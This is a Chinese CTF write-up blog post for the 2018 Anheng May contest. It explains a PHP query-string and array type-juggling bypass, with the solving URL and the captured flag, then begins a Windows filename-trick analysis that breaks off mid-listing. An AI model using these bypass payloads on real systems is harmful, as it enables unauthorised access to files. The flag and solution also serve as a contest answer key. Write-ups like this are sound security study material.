@@ -1,0 +1,1315 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="WEB奇怪的恐龙特性 大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018安恒五月月赛WriteUp">
+<meta property="og:url" content="http://blog.Lhaihai.wang/2018/05/22/2018安恒五月月赛WriteUp/index.html">
+<meta property="og:site_name" content="Lhaihai&#39;s Blog">
+<meta property="og:description" content="WEB奇怪的恐龙特性 大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526966811732.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968028071.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968048447.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968952854.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970455005.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970480922.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970551824.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526969664379.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526969882637.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970077793.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970228303.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526971766987.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526971888625.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972049073.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972166936.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972278977.png">
+<meta property="og:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526805894626.png">
+<meta property="og:updated_time" content="2018-05-22T15:23:14.194Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018安恒五月月赛WriteUp">
+<meta name="twitter:description" content="WEB奇怪的恐龙特性 大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。">
+<meta name="twitter:image" content="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526966811732.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://blog.Lhaihai.wang/2018/05/22/2018安恒五月月赛WriteUp/"/>
+
+
+
+
+
+  <title>2018安恒五月月赛WriteUp | Lhaihai's Blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-117483741-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+  
+  <script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+ 
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lhaihai's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://blog.Lhaihai.wang/2018/05/22/2018安恒五月月赛WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lhaihai">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lhaihai's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018安恒五月月赛WriteUp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-22T23:18:21+08:00">
+                2018-05-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WriteUp/" itemprop="url" rel="index">
+                    <span itemprop="name">WriteUp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o">本文总阅读量</i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><blockquote>
+<p>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。 </p>
+</blockquote>
+<a id="more"></a>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> A_A,too small</span><br></pre></td></tr></table></figure>
+<p>分析一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>;</span><br></pre></td></tr></table></figure>
+<p>如果有get参数A_A，就把A_A的值赋给$str</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。 </p>
+<p>$_SERVER[“QUERY_STRING”]获取查询语句，实例中可知，获取的是?后面的值 </p>
+<p>例如<code>http://101.71.29.5:10007/?A_A=1</code></p>
+<p>$_SERVER[“QUERY_STRING”]的值是：<code>A_A=1</code></p>
+<p>那么怎么绕过这个strpos并且把$str赋值呢？</p>
+<p>我们来了解一下下面这个php特性</p>
+<blockquote>
+<p>php自身在解析请求的时候，如果参数名字中包含” “、”.”、”[“这几个字符，会将他们转换成下划线。 那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php先将user.id转换成user_id，即为/t.php?user_id=11111&amp;user_id=22222 ，再获取到的<code>$_REQUEST[&#39;user_id&#39;]</code>就是22222。 </p>
+</blockquote>
+<p>那么这里绕过可以用A.A,A+A(这道题测试+也是可以绕过)</p>
+<p><a href="https://blog.csdn.net/iamtheodore/article/details/6098521" target="_blank" rel="noopener">PHP获取当前url路径的函数及服务器变量:QUERY_STRING、REQUEST_URI、SCRIPT</a> </p>
+<p><a href="https://bugs.leavesongs.com/php/%E8%B4%B7%E9%BD%90%E4%B9%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%EF%BC%88%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%89/" target="_blank" rel="noopener">https://bugs.leavesongs.com/php/%E8%B4%B7%E9%BD%90%E4%B9%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%EF%BC%88%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%89/</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后这里判断</p>
+<p>$str不能小于9999999999，</p>
+<p>(string)$str不能大于0</p>
+<p>贴一下xsser直播讲解的例子，我们可以看到 []&gt;9999999是真，[]&gt;-1也是真，反过来就是[]&lt;999999为假</p>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526966811732.png" alt="1526966811732"></p>
+<p>自己再测试一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump([]&lt;<span class="number">999999</span>);</span><br><span class="line">var_dump((string)[]);</span><br><span class="line">var_dump((string)[]&gt;<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>结果为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">boolean false</span><br><span class="line">string &apos;Array&apos; (length=5)</span><br><span class="line">boolean false</span><br></pre></td></tr></table></figure>
+<p>我们可以看到 (string)[]，php会把数组经过string转换后变为  </p>
+<p> 值为Array的string类型</p>
+<p>因为当字符串和数字比较时，php会把字符串转换为int类型，如果字符串开头是字符，就转换为0</p>
+<p>这样就绕过了<code>elseif ((string)$str&gt;0)</code></p>
+<p>不理解的话再放xsser的两张ppt</p>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968028071.png" alt="1526968028071"></p>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968048447.png" alt="1526968048447"></p>
+<p>最后总结一下：</p>
+<blockquote>
+<ol>
+<li>用 <code>A.A</code>绕过<code>if (strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;) !==false)</code></li>
+<li>用数组绕过 <code>($str&lt;9999999999)</code>  和 <code>((string)$str&gt;0)</code></li>
+</ol>
+</blockquote>
+<p>playload</p>
+<blockquote>
+<p><a href="http://101.71.29.5:10007/?A+A[]=1" target="_blank" rel="noopener">http://101.71.29.5:10007/?A+A[]=1</a></p>
+</blockquote>
+<p>查看源代码即可看到flag</p>
+<blockquote>
+<p>flag={09bc24026c987ae44a6e424479b2e3} </p>
+</blockquote>
+<p><a href="https://blog.csdn.net/wy_97/article/details/79088218" target="_blank" rel="noopener">PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</a> </p>
+<h2 id="不能注册的admin"><a href="#不能注册的admin" class="headerlink" title="不能注册的admin"></a>不能注册的admin</h2><blockquote>
+<p>你敢注册一个“admin”账户吗？敢吗？你试试？ </p>
+</blockquote>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968952854.png" alt="1526968952854"></p>
+<p>查看源代码发现有一段js代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">id = $(<span class="string">"#uid"</span>).val();</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">"#uid"</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(id !== <span class="string">""</span>|| !id)&#123;</span><br><span class="line">			$.ajax(&#123;</span><br><span class="line">			url:<span class="string">"json.php"</span>,<span class="attr">type</span>:<span class="string">'post'</span>,<span class="attr">data</span>:&#123;<span class="string">'id'</span>:id&#125;,<span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line">					<span class="keyword">var</span> data = <span class="built_in">eval</span>(<span class="string">'('</span> +d +<span class="string">')'</span>);</span><br><span class="line">					<span class="keyword">if</span>(data[<span class="string">'id'</span>] !=<span class="string">'undefined'</span> ||data[<span class="string">'id'</span>] !=<span class="string">""</span> ||data[<span class="string">'id'</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">						alert(<span class="string">'用户名已存在!'</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析一波，这段代码就是把id参数post给json.php</p>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970455005.png" alt="1526970455005"></p>
+<p>尝试一波注入，发现不行</p>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970480922.png" alt="1526970480922"></p>
+<p>查看一下网络，发现响应头写着(Win32)，那可能是windows服务器</p>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970551824.png" alt="1526970551824"></p>
+<p>想到windows大小写不敏感</p>
+<blockquote>
+<p>1、在window系统中，所有的文件夹或者文件名是不区分大小写的。即在同一个目录下不能同时存在名称相同大小写不一样的文件夹或者文件。</p>
+<p>2、在压缩文件中是可以同时存在如上所述的文件的。例如：文件夹a 和 文件夹A 以及test.txt和TEST.txt是可以同时存在同一目录下的。</p>
+</blockquote>
+<p>补充学习：</p>
+<p><a href="https://www.bbsmax.com/A/Ae5R4bnNzQ/的Rotten" target="_blank" rel="noopener">https://www.bbsmax.com/A/Ae5R4bnNzQ/的Rotten</a> Uploader</p>
+<p>实验发现，在Windows系统中， &lt; 符号可以代替扩展名的一部分，如果没有扩展名（没有 <strong>.</strong> ）就可以代替全部。</p>
+<p>例如此目录下有 index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">D:\www\test&gt;type &quot;index&lt;&quot;</span><br><span class="line">系统找不到指定的文件。</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index&lt;&quot;</span><br><span class="line">系统找不到指定的文件。</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.p&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.php&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br><span class="line"> </span><br><span 